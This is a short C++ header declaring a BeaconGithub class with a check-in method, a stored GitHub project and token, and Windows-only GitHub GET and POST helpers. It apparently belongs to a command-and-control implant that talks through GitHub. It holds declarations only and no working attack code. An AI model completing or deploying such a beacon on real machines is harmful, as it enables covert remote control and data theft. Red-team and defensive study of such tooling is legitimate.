#pragma once

#include "Beacon.hpp"


class BeaconGithub : public Beacon
{

public:
	BeaconGithub(std::string& config, const std::string& project, const std::string& token);
	~BeaconGithub();

	void checkIn();

private:	
	std::string m_project;
	std::string m_token;

#ifdef _WIN32
	int HandleRequest(const std::string& domain, const std::string& url);

	int GithubPost(const std::string& domain, const std::string& url, const std::string& data, std::string &response);
	int GithubGet(const std::string& domain, const std::string& url, std::string &response);
#endif

};
